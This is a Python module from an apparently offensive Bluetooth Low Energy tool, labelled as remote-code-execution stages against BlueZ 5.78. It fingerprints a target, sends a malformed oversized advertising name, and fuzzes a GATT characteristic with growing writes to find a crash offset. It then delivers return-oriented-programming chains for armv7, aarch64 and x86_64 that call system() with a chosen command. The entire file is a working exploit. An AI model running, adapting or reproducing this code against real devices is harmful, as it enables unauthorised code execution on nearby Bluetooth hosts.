# rce stages for bluez 5.78: eir leak and the 0x1f20 action overflow

from __future__ import annotations

import asyncio
import struct
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable

from . import protocol
from .transport import Advertisement, Transport, TransportError

ACTION_CHARACTERISTIC = "00001f20-0000-1000-8000-00805f9b34fb"
ACTION_SERVICE = "00001f1f-0000-1000-8000-00805f9b34fb"
ROUTE_CHARACTERISTIC = "00002020-0000-1000-8000-00805f9b34fb"
MAX_ATT_VALUE = 512


def de_bruijn(
    length: int,
    alphabet: bytes = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    order: int = 4,
) -> bytes:
    # cyclic pattern for offset discovery
    if length <= 0:
        return b""
    k = len(alphabet)
    a = [0] * (k * order)
    sequence: list[int] = []

    def db(t: int, p: int) -> None:
        if t > order:
            if order % p == 0:
                sequence.extend(a[1 : p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    pattern = bytes(alphabet[i] for i in sequence)
    while len(pattern) < length:
        pattern += pattern
    return pattern[:length]


def prepare_write(handle: int, offset: int, value: bytes) -> bytes:
    return protocol.att_prepare_write(handle, offset, value)


def execute_write(flags: int = 1) -> bytes:
    return protocol.att_execute_write(flags)


def arm_rop(
    system: int,
    pop_r0_pc: int,
    command: str,
    offset: int = 256,
    size: int = MAX_ATT_VALUE,
    thumb: bool = True,
    gadget_words: int = 2,
    gadget_filler: int = 0,
    system_thumb: bool | None = None,
    command_addr: int | None = None,
    return_addr: int | None = None,
) -> bytes:
    # armv7 ret2libc chain; only the gadget and system carry the thumb bit
    if offset >= size:
        raise ValueError("offset must be smaller than the value size")
    if gadget_words < 2:
        raise ValueError("gadget must pop r0 and pc")
    if system_thumb is None:
        system_thumb = thumb
    command_bytes = command.encode() + b"\x00"
    chain_at = offset
    chain_len = 4 * (1 + gadget_words + (1 if return_addr is not None else 0))
    command_at = command_addr if command_addr is not None else chain_at + chain_len
    if command_addr is None and command_at + len(command_bytes) > size:
        raise ValueError("command does not fit")
    words = [pop_r0_pc | (1 if thumb else 0), command_at]
    words.extend([gadget_filler] * (gadget_words - 2))
    words.append(system | (1 if system_thumb else 0))
    if return_addr is not None:
        words.append(return_addr)
    value = bytearray(b"A" * size)
    value[chain_at : chain_at + chain_len] = struct.pack(f"<{len(words)}I", *words)
    if command_addr is None:
        value[command_at : command_at + len(command_bytes)] = command_bytes
    return bytes(value)


def aarch64_rop(
    system: int,
    pop_x0_ret: int,
    command: str,
    offset: int = 256,
    size: int = MAX_ATT_VALUE,
    command_addr: int | None = None,
    return_addr: int | None = None,
    align_ret: int | None = None,
) -> bytes:
    command_bytes = command.encode() + b"\x00"
    chain_at = offset
    words = [pop_x0_ret, 0, system]
    if align_ret is not None:
        words = [pop_x0_ret, 0, align_ret, system]
    if return_addr is not None:
        words.append(return_addr)
    command_at = command_addr if command_addr is not None else chain_at + 8 * len(words)
    if command_addr is None and command_at + len(command_bytes) > size:
        raise ValueError("command does not fit")
    words[1] = command_at
    value = bytearray(b"A" * size)
    value[chain_at : chain_at + 8 * len(words)] = struct.pack(f"<{len(words)}Q", *words)
    if command_addr is None:
        value[command_at : command_at + len(command_bytes)] = command_bytes
    return bytes(value)


def x86_64_rop(
    system: int,
    pop_rdi_ret: int,
    command: str,
    offset: int = 256,
    size: int = MAX_ATT_VALUE,
    command_addr: int | None = None,
    return_addr: int | None = None,
    align_ret: int | None = None,
) -> bytes:
    command_bytes = command.encode() + b"\x00"
    chain_at = offset
    words = [pop_rdi_ret, 0, system]
    if align_ret is not None:
        words = [pop_rdi_ret, 0, align_ret, system]
    if return_addr is not None:
        words.append(return_addr)
    command_at = command_addr if command_addr is not None else chain_at + 8 * len(words)
    if command_addr is None and command_at + len(command_bytes) > size:
        raise ValueError("command does not fit")
    words[1] = command_at
    value = bytearray(b"A" * size)
    value[chain_at : chain_at + 8 * len(words)] = struct.pack(f"<{len(words)}Q", *words)
    if command_addr is None:
        value[command_at : command_at + len(command_bytes)] = command_bytes
    return bytes(value)


@dataclass
class RCEConfig:
    address: str | None = None
    profile: str = "armv7"
    command: str = "id"
    offset: int = 256
    offsets: list[int] = field(default_factory=list)
    size: int = MAX_ATT_VALUE
    system: int | None = None
    gadget: int | None = None
    command_addr: int | None = None
    align_ret: int | None = None
    leak_length: int = 253
    scan_seconds: float = 20.0
    settle: float = 1.5
    recovery: float = 25.0
    action_handle: int | None = None
    write_mode: str = "auto"
    mtu: int = 517
    gadget_words: int = 2
    hello: bool = False
    ladder: bool = False
    ladder_lengths: str = "1,4,8,16,24,32,48,64,96,128,160,192,224,240,248,252,256,260,264,272,288,320,384,448,512"
    leak: bool = True
    dry_run: bool = False


@dataclass
class StageResult:
    stage: str
    status: str
    summary: str
    evidence: dict[str, Any] = field(default_factory=dict)


class TargetTracker:
    def __init__(self, transport: Transport, address: str | None):
        self.transport = transport
        self.address = address
        self.last_seen = 0.0
        self.first_seen = 0.0
        self.seen = 0
        self.advertisement: Advertisement | None = None
        self.fingerprint: dict[str, Any] | None = None
        self._wanted = asyncio.Event()

    def on_advertisement(self, advertisement: Advertisement) -> None:
        if advertisement.candidate is None:
            return
        if self.address is not None and advertisement.address != self.address:
            return
        if self.address is None:
            self.address = advertisement.address
        self.advertisement = advertisement
        self.last_seen = time.monotonic()
        if not self.first_seen:
            self.first_seen = self.last_seen
        self.seen += 1
        self.fingerprint = protocol.fingerprint(
            advertisement.address, advertisement.name, None, advertisement.decoded
        )
        self._wanted.set()

    async def wait(self, timeout: float) -> Advertisement:
        await asyncio.wait_for(self._wanted.wait(), timeout)
        assert self.advertisement is not None
        return self.advertisement

    def alive(self, window: float = 5.0) -> bool:
        return time.monotonic() - self.last_seen < window

    async def wait_alive(self, recovery: float) -> bool:
        deadline = time.monotonic() + recovery
        while time.monotonic() < deadline:
            if self.alive():
                return True
            await asyncio.sleep(0.2)
        return self.alive()

    async def wait_silence(self, settle: float, recovery: float) -> int:
        before = self.last_seen
        await asyncio.sleep(settle)
        if self.last_seen > before:
            return 0
        started = time.monotonic()
        deadline = started + recovery
        while time.monotonic() < deadline:
            if self.last_seen > before:
                return int((self.last_seen - before) * 1000)
            await asyncio.sleep(0.2)
        return -1


class RCE:
    def __init__(
        self,
        transport: Transport,
        config: RCEConfig,
        on_event: Callable[[dict[str, Any]], Any] | None = None,
    ):
        self.transport = transport
        self.config = config
        self.on_event = on_event
        self.tracker = TargetTracker(transport, config.address)
        self.results: list[StageResult] = []
        self.connected = False
        self.services: list[Any] = []
        self.mtu = 23

    def emit(self, event: dict[str, Any]) -> None:
        if self.on_event:
            result = self.on_event(event)
            if asyncio.iscoroutine(result):
                asyncio.create_task(result)

    def record(self, result: StageResult) -> StageResult:
        self.results.append(result)
        self.emit({"type": "rce_stage", "stage": result.stage, "status": result.status, "summary": result.summary})
        return result

    async def scan(self) -> Advertisement:
        await self.transport.start_scan(self.tracker.on_advertisement)
        return await self.tracker.wait(self.config.scan_seconds)

    async def connect(self) -> None:
        if self.connected:
            return
        assert self.tracker.address is not None
        info = await self.transport.connect(self.tracker.address, timeout=20.0)
        self.connected = True
        self.mtu = info.mtu
        self.emit({"type": "rce_connect", "mtu": info.mtu})

    async def disconnect(self) -> None:
        if not self.connected:
            return
        self.connected = False
        await self.transport.disconnect()

    async def discover(self) -> list[Any]:
        if self.services:
            return self.services
        await self.connect()
        self.services = await self.transport.discover()
        return self.services

    def find_handle(self, uuid: str) -> int | None:
        for service in self.services:
            for characteristic in service.characteristics:
                if characteristic.uuid.lower() == uuid.lower():
                    return characteristic.value_handle or characteristic.handle
        return None

    async def fingerprint(self) -> StageResult:
        advertisement = await self.scan()
        decoded = advertisement.decoded
        fingerprint = self.tracker.fingerprint or {}
        if advertisement.address != self.config.address and self.config.address is None:
            self.config.address = advertisement.address
        summary = (
            f"{advertisement.address} protocol={decoded.protocol} line={decoded.line_text} "
            f"name={advertisement.name!r} tags={','.join(fingerprint.get('tags', []))}"
        )
        status = "ok" if "bluez" in fingerprint.get("tags", []) else "finding"
        return self.record(StageResult("fingerprint", status, summary, {"fingerprint": fingerprint}))

    async def leak(self) -> StageResult:
        # send the invalid name and measure silence; the marker stays in the gap
        length = self.config.leak_length
        if not 251 <= length <= 253:
            raise ValueError("leak length must be 251..253")
        marker = b"LEAK"[: length - 250]
        name = b"\xff" * (length - len(marker)) + marker
        payload = bytes([len(name) + 1, 0x09]) + name
        await self.transport.advertise(payload, extended=True)
        try:
            await asyncio.sleep(1.0)
            try:
                await self.connect()
                await asyncio.sleep(3.0)
            except TransportError:
                pass
        finally:
            await self.disconnect()
            await self.transport.stop_advertising()
        downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
        if downtime < 0:
            status, summary = "crash", "target did not advertise again"
        elif downtime:
            status, summary = "crash", f"target silent for {downtime} ms"
        else:
            status, summary = "ok", "target kept advertising"
        return self.record(
            StageResult(
                "leak",
                status,
                summary,
                {"payload": payload.hex(), "length": len(payload), "downtime_ms": downtime},
            )
        )

    def build_action_value(self, offset: int | None = None) -> bytes:
        cfg = self.config
        offset = cfg.offset if offset is None else offset
        if cfg.system is None or cfg.gadget is None:
            return de_bruijn(cfg.size)
        if cfg.profile == "armv7":
            return arm_rop(
                cfg.system,
                cfg.gadget,
                cfg.command,
                offset,
                cfg.size,
                gadget_words=cfg.gadget_words,
                command_addr=cfg.command_addr,
            )
        if cfg.profile == "aarch64":
            return aarch64_rop(cfg.system, cfg.gadget, cfg.command, offset, cfg.size, command_addr=cfg.command_addr)
        if cfg.profile == "x86_64":
            return x86_64_rop(cfg.system, cfg.gadget, cfg.command, offset, cfg.size, command_addr=cfg.command_addr, align_ret=cfg.align_ret)
        raise ValueError(f"unknown profile {cfg.profile}")

    async def _send_command(self, handle: int, value: bytes, evidence: dict[str, Any]) -> None:
        self.emit({"type": "rce_write", "mode": "command", "handle": handle, "length": len(value)})
        await self.transport.send_att_command(protocol.att_write_command(handle, value))
        await asyncio.sleep(0.25)
        evidence["command_sent"] = True

    async def _send_prepare(self, handle: int, value: bytes, evidence: dict[str, Any]) -> bool:
        chunk = max(1, self.mtu - 5)
        self.emit({"type": "rce_write", "mode": "prepare", "handle": handle, "length": len(value), "chunk": chunk})
        offset = 0
        while offset < len(value):
            part = value[offset : offset + chunk]
            response = await self.transport.send_att(
                prepare_write(handle, offset, part), timeout=2.0
            )
            evidence.setdefault("prepare_status", []).append(response.hex() if response else None)
            if not response or response[0] != 0x17:
                return False
            offset += len(part)
        response = await self.transport.send_att(execute_write(1), timeout=2.0)
        evidence["execute_status"] = response.hex() if response else None
        return bool(response and response[0] == 0x19)

    async def _deliver_action(self, handle: int, value: bytes, evidence: dict[str, Any]) -> bool:
        if self.config.write_mode == "prepare":
            return await self._send_prepare(handle, value, evidence)
        if self.config.write_mode == "command" or self.mtu >= len(value) + 3:
            await self._send_command(handle, value, evidence)
            return True
        return await self._send_prepare(handle, value, evidence)

    async def _action_once(self, handle: int, offset: int) -> StageResult:
        value = self.build_action_value(offset)
        if len(value) > MAX_ATT_VALUE:
            raise ValueError("action value exceeds 512 bytes")
        evidence: dict[str, Any] = {
            "handle": handle,
            "length": len(value),
            "profile": self.config.profile,
            "offset": offset,
            "mtu": self.mtu,
            "write_mode": self.config.write_mode,
            "pattern": self.config.system is None or self.config.gadget is None,
        }
        if self.config.dry_run:
            return self.record(StageResult("action", "ok", f"dry run, {len(value)} bytes", evidence))
        try:
            if self.config.mtu:
                self.mtu = await self.transport.request_mtu(self.config.mtu)
                evidence["mtu"] = self.mtu
            evidence["delivered"] = await self._deliver_action(handle, value, evidence)
        except TransportError as error:
            evidence["error"] = str(error)
            evidence["delivered"] = False
        finally:
            await self.disconnect()
        downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
        evidence["downtime_ms"] = downtime
        if downtime < 0:
            return self.record(StageResult("action", "crash", "target did not advertise again", evidence))
        if downtime:
            return self.record(StageResult("action", "crash", f"offset {offset}: target silent for {downtime} ms", evidence))
        return self.record(StageResult("action", "ok", f"offset {offset}: target kept advertising", evidence))

    async def hello_write(self, handle: int) -> bool:
        # send a 0x01 stop request to prove the write path
        evidence: dict[str, Any] = {"handle": handle, "length": 1, "write_mode": "command"}
        if self.config.dry_run:
            self.record(StageResult("hello", "ok", "dry run, 1-byte stop request", evidence))
            return True
        try:
            if self.config.mtu:
                self.mtu = await self.transport.request_mtu(self.config.mtu)
            await self._send_command(handle, b"\x01", evidence)
        except TransportError as error:
            evidence["error"] = str(error)
            self.record(StageResult("hello", "error", f"1-byte write failed: {error}", evidence))
            return False
        self.record(StageResult("hello", "ok", "1-byte stop request sent", evidence))
        return True

    async def ladder(self, handle: int) -> StageResult | None:
        # grow the fill value and stop at the first crash; that length is the offset
        lengths = [int(v) for v in self.config.ladder_lengths.split(",") if v]
        if self.config.dry_run:
            return self.record(StageResult("ladder", "ok", "dry run, no crash detection", {"lengths": lengths}))
        result: StageResult | None = None
        for length in lengths:
            value = b"A" * min(length, MAX_ATT_VALUE)
            evidence: dict[str, Any] = {"handle": handle, "length": len(value), "write_mode": self.config.write_mode}
            try:
                if self.config.mtu:
                    self.mtu = await self.transport.request_mtu(self.config.mtu)
                evidence["mtu"] = self.mtu
                evidence["delivered"] = await self._deliver_action(handle, value, evidence)
            except TransportError as error:
                evidence["error"] = str(error)
            finally:
                await self.disconnect()
            downtime = await self.tracker.wait_silence(self.config.settle, self.config.recovery)
            evidence["downtime_ms"] = downtime
            if downtime != 0:
                result = self.record(
                    StageResult("ladder", "crash", f"first crash at {len(value)} bytes", evidence)
                )
                break
            result = self.record(StageResult("ladder", "ok", f"{len(value)} bytes survived", evidence))
            if not await self.tracker.wait_alive(self.config.recovery):
                break
        return result

    async def action(self) -> StageResult | None:
        # deliver with a write command or prepare/execute
        await self.discover()
        handle = self.config.action_handle or self.find_handle(ACTION_CHARACTERISTIC)
        if handle is None:
            return self.record(StageResult("action", "skipped", "0x1f20 not found"))
        if self.config.hello and not await self.hello_write(handle):
            return self.record(StageResult("action", "skipped", "hello write failed"))
        if self.config.ladder:
            await self.ladder(handle)
            await self.tracker.wait_alive(self.config.recovery)
            self.services = []
            await self.discover()
            handle = self.find_handle(ACTION_CHARACTERISTIC) or handle
        offsets = self.config.offsets or [self.config.offset]
        result: StageResult | None = None
        for offset in offsets:
            result = await self._action_once(handle, offset)
            if result.status == "crash" and offset != offsets[-1]:
                await self.tracker.wait_alive(self.config.recovery)
                self.services = []
                await self.discover()
                handle = self.find_handle(ACTION_CHARACTERISTIC) or handle
        return result

    async def run(self) -> list[StageResult]:
        try:
            await self.fingerprint()
            if self.config.leak:
                await self.leak()
            if self.tracker.address is not None:
                await self.tracker.wait_alive(self.config.recovery)
                await self.action()
        finally:
            await self.disconnect()
            await self.transport.stop_advertising()
            await self.transport.stop_scan()
        return self.results

    def summary(self) -> dict[str, Any]:
        return {
            "address": self.config.address,
            "profile": self.config.profile,
            "stages": [
                {"stage": result.stage, "status": result.status, "summary": result.summary, "evidence": result.evidence}
                for result in self.results
            ],
        }
